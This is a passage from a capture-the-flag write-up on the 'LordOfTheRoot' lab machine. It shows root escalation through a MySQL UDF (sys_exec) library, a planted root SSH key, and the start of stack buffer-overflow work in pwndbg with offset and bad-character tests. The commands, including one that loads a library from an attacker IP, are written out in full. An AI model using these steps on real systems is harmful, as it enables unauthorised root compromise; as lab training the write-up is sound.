mysql> show variables like '%compile%';
+-------------------------+------------------+
| Variable_name           | Value            |
+-------------------------+------------------+
| version_compile_machine | i686             |
| version_compile_os      | debian-linux-gnu |
+-------------------------+------------------+
2 rows in set (0.00 sec)
```

- I assume `i686` is 64 bit OS, but NO:
` i686 is the 32-bit version, and x86_64 is the 64-bit version of the OS.`

- So to be honest I have no idea if this 64 bit dll is going to work or not, if not, no worries, we have a good repo from github:
`https://github.com/mysqludf/lib_mysqludf_sys`

- And we need to confirm the `plugin_dir` location, from `@@plugin_dir` variable:
```bash
mysql> select @@plugin_dir;
+------------------------+
| @@plugin_dir           |
+------------------------+
| /usr/lib/mysql/plugin/ |
+------------------------+
1 row in set (0.00 sec)

mysql> show variables like 'plugin%';
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
1 row in set (0.00 sec)
```

- Now we uploading the udf.dll, there's many ways to do this, but, there's a function `load_file` can load file from network path, which is brilliant.
```bash
mysql> select load_file('\\\\192.168.59.60:8000\lib_mysqludf_sys_64.dll') into dumpfile "/usr/lib/mysql/plugin/udf.dll";
Query OK, 1 row affected (0.00 sec)
```

- OK, my stupid, dll only works on Windows..... Here's the choices we can have, and we should use \*.so file
```bash
┌──(htb㉿kali)-[/usr/…/metasploit-framework/data/exploits/mysql]
└─$ ls -al
total 52
drwxr-xr-x   2 root root  4096 May 25 18:55 .
drwxr-xr-x 177 root root 16384 May 25 18:55 ..
-rwxr-xr-x   1 root root  6656 May 20 01:47 lib_mysqludf_sys_32.dll
-rw-r--r--   1 root root  5696 May 20 01:47 lib_mysqludf_sys_32.so
-rwxr-xr-x   1 root root  7168 May 20 01:47 lib_mysqludf_sys_64.dll
-rw-r--r--   1 root root  8040 May 20 01:47 lib_mysqludf_sys_64.so
```

- But the files input by `load_file` function got only 1 byte files.....:
```bash
smeagol@LordOfTheRoot:/usr/lib/mysql/plugin$ ls -al
total 176
...[snip]...
-rw-rw-rw- 1 root root     1 May 31 04:35 udf.dll
-rw-rw-rw- 1 root root     1 May 31 04:44 udf.so
```

- Maybe network file load is not that solid..... let's do this old school way, and here's the script:
```
#!/bin/bash

echo "SELECT 0x" > payload
cat lib_mysqludf_sys_32.so | xxd -p >> payload
echo " INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'; " >> payload
echo "DROP FUNCTION IF EXISTS sys_exec; " >> payload
echo "CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so'; " >> payload

mysql -h localhost -u root -pdarkshadow < payload
```

- Suddenly I understand why I got 1 byte file, I'm not share file by smb, I'm using http server, which means my share folder path won't work.......alright, I tried load_file on http url, also not work.
- Anyway, `load_file()` working good on local file:
```bash
mysql> select load_file('/dev/shm/lib_mysqludf_sys_32.so') into dumpfile "/usr/lib/mysql/plugin/ex_udf.so";
Query OK, 1 row affected (0.01 sec)

smeagol@LordOfTheRoot:/dev/shm$ ls -al /usr/lib/mysql/plugin/
-rw-rw-rw- 1 root root  5696 May 31 05:07 ex_udf.so

mysql> select * from mysql.func;
Empty set (0.00 sec)

mysql> DROP FUNCTION IF EXISTS sys_exec;
Query OK, 0 rows affected, 1 warning (0.00 sec)

mysql> CREATE FUNCTION sys_exec RETURNS int SONAME 'ex_udf.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select * from mysql.func;
+----------+-----+-----------+----------+
| name     | ret | dl        | type     |
+----------+-----+-----------+----------+
| sys_exec |   2 | ex_udf.so | function |
+----------+-----+-----------+----------+
1 row in set (0.00 sec)

mysql> select sys_exec('pwd');
+-----------------+
| sys_exec('pwd') |
+-----------------+
|               0 |
+-----------------+
1 row in set (0.01 sec)
```

- OK, function testing working, since the return value is 0, but it won't give actual content.
- Let's create ssh key for user smeagol:
```bash
smeagol@LordOfTheRoot:~$ cd .ssh
-bash: cd: .ssh: No such file or directory
smeagol@LordOfTheRoot:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/smeagol/.ssh/id_rsa):
Created directory '/home/smeagol/.ssh'.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/smeagol/.ssh/id_rsa.
Your public key has been saved in /home/smeagol/.ssh/id_rsa.pub.
The key fingerprint is:
e5:74:8e:5a:69:df:f8:e8:ea:04:16:bc:fc:5e:fb:1c smeagol@LordOfTheRoot
The key's randomart image is:
+--[ RSA 2048]----+
|                 |
|       .         |
|        o o .    |
|       . * =     |
|        S * .    |
|       . * . o   |
|        . o + E  |
|         o . = . |
|         .+o+.+  |
+-----------------+
smeagol@LordOfTheRoot:~$ cd .ssh
smeagol@LordOfTheRoot:~/.ssh$ ls
id_rsa  id_rsa.pub
smeagol@LordOfTheRoot:~/.ssh$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTU7L2krEHV9FCYCaWB3Da1dQgJhm+Sjo1GZF8Dht6Wf0LEgO1PP2N/kS0FZgd4bFQ1+rtwxfruT3CPJBzmbekNjHGUqnnHaLdlLNcXRZ+3pBRRWCqvmoRuXpEgr1MhQ50BxTrNpOYM+e9BK0zRrqvoQImsyGGIILnkgxUq4UteAp9kVbzG07WKBBJxuTx8Xjn3yTgdBhS1olpHTXoVgm+KL9st5rVYAvbPsXIYRRUP5AQoLdhsjEl31+L3db8UaJPjdK+aFOcE8C5Zt4dzAQ4XbH1OtBohy7XQHRL8d7JDUTmIBPcpwh7maHZygSTI2L93tdqL/YrbkRN8cSk5MOZ smeagol@LordOfTheRoot
```
- Let's drop this key into root folder.
```bash
mysql> select "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTU7L2krEHV9FCYCaWB3Da1dQgJhm+Sjo1GZF8Dht6Wf0LEgO1PP2N/kS0FZgd4bFQ1+rtwxfruT3CPJBzmbekNjHGUqnnHaLdlLNcXRZ+3pBRRWCqvmoRuXpEgr1MhQ50BxTrNpOYM+e9BK0zRrqvoQImsyGGIILnkgxUq4UteAp9kVbzG07WKBBJxuTx8Xjn3yTgdBhS1olpHTXoVgm+KL9st5rVYAvbPsXIYRRUP5AQoLdhsjEl31+L3db8UaJPjdK+aFOcE8C5Zt4dzAQ4XbH1OtBohy7XQHRL8d7JDUTmIBPcpwh7maHZygSTI2L93tdqL/YrbkRN8cSk5MOZ smeagol@LordOfTheRoot" into outfile "/root/.ssh/authorized_keys";
ERROR 1 (HY000): Can't create/write to file '/root/.ssh/authorized_keys' (Errcode: 2)
```
- And we've got an error, that's weird. Need more test.
```bash
mysql> select "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTU7L2krEHV9FCYCaWB3Da1dQgJhm+Sjo1GZF8Dht6Wf0LEgO1PP2N/kS0FZgd4bFQ1+rtwxfruT3CPJBzmbekNjHGUqnnHaLdlLNcXRZ+3pBRRWCqvmoRuXpEgr1MhQ50BxTrNpOYM+e9BK0zRrqvoQImsyGGIILnkgxUq4UteAp9kVbzG07WKBBJxuTx8Xjn3yTgdBhS1olpHTXoVgm+KL9st5rVYAvbPsXIYRRUP5AQoLdhsjEl31+L3db8UaJPjdK+aFOcE8C5Zt4dzAQ4XbH1OtBohy7XQHRL8d7JDUTmIBPcpwh7maHZygSTI2L93tdqL/YrbkRN8cSk5MOZ smeagol@LordOfTheRoot" into outfile "/root/testkeys";
Query OK, 1 row affected (0.00 sec)
```

- Well, and drop file directly into `/root` folder works. So the best guess is possible `.ssh/` folder is not exist.
```bash
mysql> select sys_exec("mkdir /root/.ssh/");
+-------------------------------+
| sys_exec("mkdir /root/.ssh/") |
+-------------------------------+
|                             0 |
+-------------------------------+
1 row in set (0.00 sec)

mysql> select "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTU7L2krEHV9FCYCaWB3Da1dQgJhm+Sjo1GZF8Dht6Wf0LEgO1PP2N/kS0FZgd4bFQ1+rtwxfruT3CPJBzmbekNjHGUqnnHaLdlLNcXRZ+3pBRRWCqvmoRuXpEgr1MhQ50BxTrNpOYM+e9BK0zRrqvoQImsyGGIILnkgxUq4UteAp9kVbzG07WKBBJxuTx8Xjn3yTgdBhS1olpHTXoVgm+KL9st5rVYAvbPsXIYRRUP5AQoLdhsjEl31+L3db8UaJPjdK+aFOcE8C5Zt4dzAQ4XbH1OtBohy7XQHRL8d7JDUTmIBPcpwh7maHZygSTI2L93tdqL/YrbkRN8cSk5MOZ smeagol@LordOfTheRoot" into outfile "/root/.ssh/authorized_keys";
Query OK, 1 row affected (0.00 sec)

mysql> select sys_exec("chmod 600 /root/.ssh/authorized_keys");
+--------------------------------------------------+
| sys_exec("chmod 600 /root/.ssh/authorized_keys") |
+--------------------------------------------------+
|                                                0 |
+--------------------------------------------------+
1 row in set (0.00 sec)
```
- Wow, ok, work like magic, is it?
- Now let's ssh to root by user `smeagol`'s key:
```bash
smeagol@LordOfTheRoot:~/.ssh$ ssh -i id_rsa root@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
...[snip]...
root@LordOfTheRoot:~# id
uid=0(root) gid=0(root) groups=0(root)
root@LordOfTheRoot:~# ls -al
total 80
drwx------  4 root root 4096 May 31 05:22 .
drwxr-xr-x 23 root root 4096 Sep 22  2015 ..
-rw-------  1 root root  120 Sep 23  2015 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
-rwsr-xr-x  1 root root 5150 Sep 22  2015 buf
-rw-r-----  1 root root  240 Sep 17  2015 buf.c
drwx------  2 root root 4096 May 31 05:22 .cache
-rw-r--r--  1 root root  121 Sep 18  2015 Flag.txt
-rw-------  1 root root  830 Sep 17  2015 .mysql_history
-rwsr-xr-x  1 root root 7370 Sep 17  2015 other
-rw-r-----  1 root root  288 Sep 17  2015 other.c
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-r--r--  1 root root   66 Sep 18  2015 .selected_editor
drwxrwx--x  2 root root 4096 May 31 05:19 .ssh
-rwxr-----  1 root root  426 Sep 22  2015 switcher.py
-rw-rw-rw-  1 root root  403 May 31 05:17 testkeys
-rw-------  1 root root 4111 Sep 21  2015 .viminfo
root@LordOfTheRoot:~# cat Flag.txt
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf
```

- And we are in. This is one way, and I consider this is a simple way, because the buffer overflow is really not my thing................

- But we will still have to talk about it later after.
- We can see how this box is setup here, the program `buf` is actually the one need to overflow.
- Port knocking is to insert or delete iptables rule.
```bash
root@LordOfTheRoot:~# cat switcher.py
#!/usr/bin/python
import os
from random import randint

targets= ["/SECRET/door1/","/SECRET/door2/","/SECRET/door3/"]
for t in targets:
   os.system("rm "+t+"*")
   os.system("cp -p other "+t)
   os.system("cp -p "+t+"other "+t+"file")
   os.system("rm "+t+"other")

luckyDoor = randint(0,2)
t=targets[luckyDoor]
os.system("rm "+t+"*")
os.system("cp -p buf "+t)
os.system("cp -p "+t+"buf "+t+"file")
os.system("rm "+t+"buf")

root@LordOfTheRoot:~# crontab -l
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
*/3 * * * * /root/switcher.py
root@LordOfTheRoot:~# cat /etc/knockd.conf
[options]
        UseSyslog

[openHTTP]
        sequence    = 1,2,3
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT 1 -s %IP% -p tcp --dport 1337 -j ACCEPT
        tcpflags    = syn

[closeHTTP]
        sequence    = 6,5,4
        seq_timeout = 100
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 1337 -j ACCEPT
        tcpflags    = syn
root@LordOfTheRoot:~#
```

===================================================================
## Buffer Overflow by pwndbg
- pattern create
```bash
┌──(htb㉿kali)-[/dev/shm]
└─$ gdb-pwndbg buf
Reading symbols from buf...
(No debugging symbols found in buf)
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> cyclic 250
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma
pwndbg> r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma
Starting program: /dev/shm/buf aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma

Program received signal SIGSEGV, Segmentation fault.
0x61617362 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0xffffd650 ◂— 'aacma'
 EDX  0xffffd376 ◂— 'aacma'
 EDI  0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 EBP  0x61617262 ('braa')
 ESP  0xffffd330 ◂— 'btaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma'
 EIP  0x61617362 ('bsaa')
─────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────
Invalid address 0x61617362

─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ esp 0xffffd330 ◂— 'btaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma'
01:0004│     0xffffd334 ◂— 'buaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma'
02:0008│     0xffffd338 ◂— 'bvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma'
03:000c│     0xffffd33c ◂— 'bwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma'
04:0010│     0xffffd340 ◂— 'bxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma'
05:0014│     0xffffd344 ◂— 'byaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma'
06:0018│     0xffffd348 ◂— 'bzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma'
07:001c│     0xffffd34c ◂— 'cbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma'
───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
 ► f 0 0x61617362
   f 1 0x61617462
   f 2 0x61617562
   f 3 0x61617662
   f 4 0x61617762
   f 5 0x61617862
   f 6 0x61617962
   f 7 0x61617a62
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l bsaa
171
pwndbg> cyclic -l 0x61617362
171
```
- use `cyclic` to looking for the value of EIP, or just easily looking for the invalid address, I think later one is much easier.
```bash
pwndbg> r $(python -c 'print "A"*171 + "B"*4')
Starting program: /dev/shm/buf $(python -c 'print "A"*171 + "B"*4')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0xffffd650 ◂— 'ABBBB'
 EDX  0xffffd37b ◂— 'ABBBB'
 EDI  0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 EBP  0x41414141 ('AAAA')
 ESP  0xffffd380 ◂— 0x0
 EIP  0x42424242 ('BBBB')
─────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────
Invalid address 0x42424242


─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ esp 0xffffd380 ◂— 0x0
01:0004│     0xffffd384 —▸ 0xffffd424 —▸ 0xffffd599 ◂— '/dev/shm/buf'
02:0008│     0xffffd388 —▸ 0xffffd430 —▸ 0xffffd656 ◂— 0x5353454c ('LESS')
03:000c│     0xffffd38c —▸ 0xffffd3b4 ◂— 0x0
04:0010│     0xffffd390 —▸ 0xffffd3c4 ◂— 0x245284ba
05:0014│     0xffffd394 —▸ 0xf7ffdb40 —▸ 0xf7ffdae0 —▸ 0xf7fca3e0 —▸ 0xf7ffd980 ◂— ...
06:0018│     0xffffd398 —▸ 0xf7fca410 —▸ 0x804826a ◂— inc    edi /* 'GLIBC_2.0' */
07:001c│     0xffffd39c —▸ 0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
 ► f 0 0x42424242
   f 1      0x0
```

- Try to own the EIP. And then we need to put in Cs to kind of see how many place we need to be filled up to find the JMP/CALL ESP if it's existed.
```bash
pwndbg> r $(python -c 'print "A"*171 + "B"*4 + "C"*200')
Starting program: /dev/shm/buf $(python -c 'print "A"*171 + "B"*4 + "C"*200')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0xffffd650 ◂— 'CCCCC'
 EDX  0xffffd383 ◂— 'CCCCC'
 EDI  0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 EBP  0x41414141 ('AAAA')
 ESP  0xffffd2c0 ◂— 0x43434343 ('CCCC')
 EIP  0x42424242 ('BBBB')
─────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────
Invalid address 0x42424242

─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ esp 0xffffd2c0 ◂— 0x43434343 ('CCCC')
───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
 ► f 0 0x42424242
   f 1 0x43434343
   f 2 0x43434343
   f 3 0x43434343
   f 4 0x43434343
   f 5 0x43434343
   f 6 0x43434343
   f 7 0x43434343
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> help x/
Examine memory: x/FMT ADDRESS.
ADDRESS is an expression for the memory address to examine.
FMT is a repeat count followed by a format letter and a size letter.
Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),
  t(binary), f(float), a(address), i(instruction), c(char), s(string)
  and z(hex, zero padded on the left).
Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).
The specified number of objects of the specified size are printed
according to the format.  If a negative number is specified, memory is
examined backward from the address.

Defaults for format and size letters are those previously used.
Default count is 1.  Default address is following last thing printed
with this command or "print".
pwndbg> x/100x 0xffffd200
0xffffd200:     0xffffd211      0xffffd4de      0xf7ffdb40      0xffffd284
0xffffd210:     0x41414149      0x41414141      0x41414141      0x41414141
0xffffd220:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd230:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd240:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd250:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd260:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd270:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd280:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd290:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd2a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd2b0:     0x41414141      0x41414141      0x41414141      0x42424242
0xffffd2c0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2d0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2e0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2f0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd300:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd310:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd320:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd330:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd340:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd350:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd360:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd370:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd380:     0x43434343      0x43434343      0xffffd600      0xffffd6f0
```

- Since the `STACK` says that the esp has the address of Cs in `0xffffd2c0`, we use `x/` command to check the memory by address a bit ahead `0xffffd200`.
- We can see from the pwndbg output, that `eax` is not owned by us, and don't think that we have JMP/CALL esp as well, we can also confirmed this by `objdump`:
```bash
┌──(htb㉿kali)-[/dev/shm]
└─$ objdump -D buf | grep -P 'jmp|call'
 80482d8:       e8 b3 00 00 00          call   8048390 <__x86.get_pc_thunk.bx>
 80482ed:       e8 3e 00 00 00          call   8048330 <__gmon_start__@plt>
 8048306:       ff 25 38 97 04 08       jmp    *0x8049738
 8048310:       ff 25 3c 97 04 08       jmp    *0x804973c
 804831b:       e9 e0 ff ff ff          jmp    8048300 <.plt>
 8048320:       ff 25 40 97 04 08       jmp    *0x8049740
 804832b:       e9 d0 ff ff ff          jmp    8048300 <.plt>
 8048330:       ff 25 44 97 04 08       jmp    *0x8049744
 804833b:       e9 c0 ff ff ff          jmp    8048300 <.plt>
 8048340:       ff 25 48 97 04 08       jmp    *0x8049748
 804834b:       e9 b0 ff ff ff          jmp    8048300 <.plt>
 8048350:       ff 25 4c 97 04 08       jmp    *0x804974c
 804835b:       e9 a0 ff ff ff          jmp    8048300 <.plt>
 804837c:       e8 cf ff ff ff          call   8048350 <__libc_start_main@plt>
 80483c6:       ff d0                   call   *%eax
 8048403:       ff d2                   call   *%edx
 804841f:       e8 7c ff ff ff          call   80483a0 <deregister_tm_clones>
 804844f:       ff d0                   call   *%eax
 8048452:       e9 79 ff ff ff          jmp    80483d0 <register_tm_clones>
 8048458:       e9 73 ff ff ff          jmp    80483d0 <register_tm_clones>
 804847f:       e8 8c fe ff ff          call   8048310 <printf@plt>
 804848b:       e8 b0 fe ff ff          call   8048340 <exit@plt>
 80484a3:       e8 78 fe ff ff          call   8048320 <strcpy@plt>
 80484b6:       e8 d5 fe ff ff          call   8048390 <__x86.get_pc_thunk.bx>
 80484ce:       e8 01 fe ff ff          call   80482d4 <_init>
 80484fb:       ff 94 bb 08 ff ff ff    call   *-0xf8(%ebx,%edi,4)
 8048511:       eb 0d                   jmp    8048520 <__libc_csu_fini>
 8048528:       e8 63 fe ff ff          call   8048390 <__x86.get_pc_thunk.bx>
 8048573:       ff 68 00                ljmp   *0x0(%eax)
 80485ab:       ff 60 00                jmp    *0x0(%eax)
 80485ef:       ff 61 00                jmp    *0x0(%ecx)
 804967e:       ff 6f 8c                ljmp   *-0x74(%edi)
 80496e6:       ff 6f 84                ljmp   *-0x7c(%edi)
 80496ee:       ff 6f 01                ljmp   *0x1(%edi)
 80496f6:       ff 6f 74                ljmp   *0x74(%edi)
```

- bad chars checking, no need `\x00` since we already know it's long-live bad char:
```bash
pwndbg> r $(python -c 'print "A"*171 + "B"*4 + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')
Starting program: /dev/shm/buf $(python -c 'print "A"*171 + "B"*4 + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0xffffd550 ◂— 0x42414141 ('AAAB')
 EDX  0xffffd279 ◂— 0x42414141 ('AAAB')
 EDI  0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 EBP  0x41414141 ('AAAA')
 ESP  0xffffd280 ◂— 0x4030201
 EIP  0x42424242 ('BBBB')
─────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────
Invalid address 0x42424242

─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ esp 0xffffd280 ◂— 0x4030201
01:0004│     0xffffd284 ◂— 0x8070605
02:0008│     0xffffd288 —▸ 0xffffd300 —▸ 0x804845d (main) ◂— push   ebp
03:000c│     0xffffd28c —▸ 0xffffd2b4 ◂— 0x0
04:0010│     0xffffd290 —▸ 0xffffd2c4 ◂— 0xfcba8873
05:0014│     0xffffd294 —▸ 0xf7ffdb40 —▸ 0xf7ffdae0 —▸ 0xf7fca3e0 —▸ 0xf7ffd980 ◂— ...
06:0018│     0xffffd298 —▸ 0xf7fca410 —▸ 0x804826a ◂— inc    edi /* 'GLIBC_2.0' */
07:001c│     0xffffd29c —▸ 0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
 ► f 0 0x42424242
   f 1 0x4030201
   f 2 0x8070605
```

- we can see from the sequence start with `01 02 03...`, if anything showed by `00` in the middle, means the original code is bad char, in our case, it's `09` and `0a` (between `0807` and `0b`)
```bash
pwndbg> x/8x  0xffffd551
0xffffd551:     0x42424141      0x02014242      0x06050403      0x0b000807
